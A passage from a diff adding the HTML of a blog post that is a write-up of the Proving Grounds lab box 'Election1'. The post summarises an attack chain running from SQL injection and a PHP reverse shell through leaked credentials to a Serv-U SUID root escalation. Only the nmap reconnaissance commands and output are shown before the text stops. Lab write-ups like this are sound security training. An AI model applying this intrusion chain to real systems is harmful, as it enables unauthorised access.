@@ -1,0 +1,4987 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" data-mode="dark">
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Election1" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Election1 is an interesting box that requires various skills to exploit and escalate privileges It starts with HTTP enumeration, identifying an Apache server hosting a vulnerable election management system. Initial access was gained through exploiting SQL Injection vulnerabilities, leading to the discovery of exposed credentials. These credentials were used to access the administrative panel of the election system. A remote code execution vulnerability was exploited using SQLMap, allowing the upload of a PHP reverse shell to gain initial shell access. Privilege escalation involved lateral movement by inspecting log files, revealing additional credentials. These credentials facilitated further access, where SUID binaries and running processes were analyzed. The final privilege escalation was achieved by exploiting a known vulnerability in the Serv-U binary with SUID permissions, ultimately leading to root access." />
+<meta property="og:description" content="Election1 is an interesting box that requires various skills to exploit and escalate privileges It starts with HTTP enumeration, identifying an Apache server hosting a vulnerable election management system. Initial access was gained through exploiting SQL Injection vulnerabilities, leading to the discovery of exposed credentials. These credentials were used to access the administrative panel of the election system. A remote code execution vulnerability was exploited using SQLMap, allowing the upload of a PHP reverse shell to gain initial shell access. Privilege escalation involved lateral movement by inspecting log files, revealing additional credentials. These credentials facilitated further access, where SUID binaries and running processes were analyzed. The final privilege escalation was achieved by exploiting a known vulnerability in the Serv-U binary with SUID permissions, ultimately leading to root access." />
+<link rel="canonical" href="http://localhost:4000/posts/Proving-Grounds-Play-Election1/" />
+<meta property="og:url" content="http://localhost:4000/posts/Proving-Grounds-Play-Election1/" />
+<meta property="og:image" content="http://localhost:4000/../assets/img/pg/offsec.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-10T00:00:00-03:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/../assets/img/pg/offsec.jpeg" />
+<meta property="twitter:title" content="Election1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-10T00:00:00-03:00","datePublished":"2024-07-10T00:00:00-03:00","description":"Election1 is an interesting box that requires various skills to exploit and escalate privileges It starts with HTTP enumeration, identifying an Apache server hosting a vulnerable election management system. Initial access was gained through exploiting SQL Injection vulnerabilities, leading to the discovery of exposed credentials. These credentials were used to access the administrative panel of the election system. A remote code execution vulnerability was exploited using SQLMap, allowing the upload of a PHP reverse shell to gain initial shell access. Privilege escalation involved lateral movement by inspecting log files, revealing additional credentials. These credentials facilitated further access, where SUID binaries and running processes were analyzed. The final privilege escalation was achieved by exploiting a known vulnerability in the Serv-U binary with SUID permissions, ultimately leading to root access.","headline":"Election1","image":"http://localhost:4000/../assets/img/pg/offsec.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Proving-Grounds-Play-Election1/"},"url":"http://localhost:4000/posts/Proving-Grounds-Play-Election1/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>Election1 | 
+  </title>
+
+  <!--
+  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
+  Generated by: https://realfavicongenerator.net/
+-->
+
+
+
+<link
+  rel="apple-touch-icon"
+  sizes="180x180"
+  href="/assets/img/favicons/apple-touch-icon.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="32x32"
+  href="/assets/img/favicons/favicon-32x32.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="16x16"
+  href="/assets/img/favicons/favicon-16x16.png"
+/>
+
+<link rel="manifest" href="/assets/img/favicons/site.q" />
+
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" />
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="application-name" content="" />
+<meta name="msapplication-TileColor" content="#da532c" />
+<meta
+  name="msapplication-config"
+  content="/assets/img/favicons/browserconfig.xml"
+/>
+<meta name="theme-color" content="#ffffff" />
+
+
+  <!-- Resource Hints -->
+  
+    
+      
+        <link rel="preconnect" href="https://fonts.googleapis.com" >
+      
+        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      
+        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      
+        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+      
+    
+  
+
+  <!-- Bootstrap -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+  
+
+  <!-- Theme style -->
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  <!-- Web Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">
+
+  <!-- 3rd-party Dependencies -->
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
+  
+
+  <!-- JavaScript -->
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.JPG" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <h1 class="site-title">
+      <a href="/">Lucas Júnior</a>
+    </h1>
+    <p class="site-subtitle fst-italic mb-0">Offensive Security Specialist | eWPTX | eCPPT | DCPT | CEH</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+      <!-- the real tabs -->
+      
+      <li class="nav-item">
+        <a href="/categories/" class="nav-link">
+          <i class="fa-fw fas fa-stream"></i>
+          
+
+          <span>CATEGORIES</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+      <li class="nav-item">
+        <a href="/tags/" class="nav-link">
+          <i class="fa-fw fas fa-tags"></i>
+          
+
+          <span>TAGS</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+      <li class="nav-item">
+        <a href="/archives/" class="nav-link">
+          <i class="fa-fw fas fa-archive"></i>
+          
+
+          <span>ARCHIVES</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+      <li class="nav-item">
+        <a href="/about/" class="nav-link">
+          <i class="fa-fw fas fa-info-circle"></i>
+          
+
+          <span>ABOUT</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap align-items-center w-100">
+    
+
+    
+    <a href="https://github.com/0xfl0k1" aria-label="GitHub" target="_blank" rel="noopener noreferrer">
+      <i class="fab fa-github"></i>
+    </a>
+    <a href="https://www.linkedin.com/in/luucaasjr" aria-label="LinkedIn" target="_blank" rel="noopener noreferrer">
+      <i class="fab fa-linkedin"></i>
+    </a>
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+            
+              <span>Election1</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search id="search" class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+<article class="px-1">
+  <header>
+    <h1 data-toc-skip>Election1</h1>
+    
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1720580400"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Jul 10, 2024
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+      
+      
+      
+
+      
+
+      <div class="mt-3 mb-3">
+        <a href="/../assets/img/pg/offsec.jpeg" class="popup img-link preview-img shimmer"><img src="/../assets/img/pg/offsec.jpeg"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+            <a href="">0xfl0k1</a>
+            
+          </em>
+        </span>
+
+        <div>
+          <!-- pageviews -->
+          
+
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="685 words"
+>
+  <em>3 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="content">
+    <p>Election1 is an interesting box that requires various skills to exploit and escalate privileges It starts with HTTP enumeration, identifying an Apache server hosting a vulnerable election management system. Initial access was gained through exploiting SQL Injection vulnerabilities, leading to the discovery of exposed credentials. These credentials were used to access the administrative panel of the election system.
+A remote code execution vulnerability was exploited using SQLMap, allowing the upload of a PHP reverse shell to gain initial shell access.
+Privilege escalation involved lateral movement by inspecting log files, revealing additional credentials. These credentials facilitated further access, where SUID binaries and running processes were analyzed.
+The final privilege escalation was achieved by exploiting a known vulnerability in the Serv-U binary with SUID permissions, ultimately leading to root access.</p>
+
+<h1 id="overview">Overview</h1>
+
+<pre><code class="language-mermaid">graph TD
+    A[Intelligence Gathering]
+    A --&gt; B[Port Scan: Port 80,22]
+    B --&gt; C[Enumeration: HTTP &gt; Exposed Credentials]
+    C --&gt; D[Exploitation &gt; Admin access, Cookie, SQLi]
+    D --&gt; E[Post-Exploitation: Lateral Escalation &gt; Sensitives Files]
+    E --&gt; F[Privilege Escalation: Serv-U With Suid Misc.]
+    F --&gt; G[Root Shell Access]
+</code></pre>
+
+<h2 id="1-intelligence-gathering"><span class="me-2">1. Intelligence Gathering</span><a href="#1-intelligence-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="port-scan"><span class="me-2">Port Scan</span><a href="#port-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">--open</span> 192.168.233.211 <span class="nt">-T5</span> <span class="nt">-v</span> 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Output</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
+|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
+|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>searching for vuln</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span>vuln <span class="nt">-p22</span>,80 192.168.233.211
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>output</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
